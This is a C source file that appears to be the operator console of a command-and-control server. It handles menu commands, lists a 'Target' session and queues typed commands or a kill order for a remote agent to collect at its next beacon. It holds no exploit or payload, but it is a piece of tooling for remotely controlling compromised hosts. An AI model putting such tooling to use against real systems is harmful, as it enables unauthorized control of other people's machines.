#include "Console.h"
#include <stdio.h>
#include <string.h>

void ConsoleClear(void)
{
#ifdef _WIN32
    int R = system("cls");
    (void)R;
#else
    fputs("\033[2J\033[H", stdout);
    fflush(stdout);
#endif
}

void ConsolePrintHelp(void)
{
    printf("\n  Management Console\n");
    printf("  %-22s %s\n", "help",          "Show this reference");
    printf("  %-22s %s\n", "clear",         "Clear terminal");
    printf("  %-22s %s\n", "session",       "List active sessions");
    printf("  %-22s %s\n", "use <id>",      "Enter interactive mode");
    printf("  %-22s %s\n", "interact <id>", "Alias for use");
    printf("  %-22s %s\n", "exit",          "Shutdown server\n");
}

int ConsoleReadLine(char *Out, int Cap)
{
    if (fgets(Out, Cap, stdin) == NULL)
        return 0;
    Out[strcspn(Out, "\n")] = '\0';
    return 1;
}

int ConsoleHandleInput(const char *Input, AgentSession *Session)
{
    if (Session->InSession) {
        if (strcmp(Input, "back") == 0) {
            SessionLeave(Session);
            printf("C2Main> ");
            fflush(stdout);

        } else if (strcmp(Input, "clear") == 0) {
            ConsoleClear();
            printf("C2Session[%s]> ", Session->Address);
            fflush(stdout);

        } else if (strcmp(Input, "exit") == 0) {
            SessionQueueCommand(Session, "kill");
            SessionReset(Session);
            printf("[*] Kill queued. Returning to main.\n");
            printf("C2Main> ");
            fflush(stdout);

        } else if (strlen(Input) > 0) {
            SessionQueueCommand(Session, Input);
            printf("[*] Command queued — waiting for next beacon...\n");
            fflush(stdout);

        } else {
            printf("C2Session[%s]> ", Session->Address);
            fflush(stdout);
        }

        return 1;
    }

    if (strcmp(Input, "help") == 0) {
        ConsolePrintHelp();

    } else if (strcmp(Input, "clear") == 0) {
        ConsoleClear();

    } else if (strcmp(Input, "exit") == 0) {
        printf("Shutting down. Goodbye.\n");
        return 0;

    } else if (strcmp(Input, "session") == 0) {
        if (Session->IsActive)
            printf("  ID: 1  |  Target: %s  |  Status: Active\n", Session->Address);
        else
            printf("  No active sessions.\n");

    } else if (strcmp(Input, "use 1")      == 0 ||
               strcmp(Input, "interact 1") == 0 ||
               strcmp(Input, "use")        == 0 ||
               strcmp(Input, "interact")   == 0) {

        if (Session->IsActive) {
            SessionEnter(Session);
            return 1;
        }
        printf("[!] No active session.\n");

    } else if (strlen(Input) > 0) {
        printf("[!] Unknown command. Type 'help'.\n");
    }

    printf("C2Main> ");
    fflush(stdout);
    return 1;
}
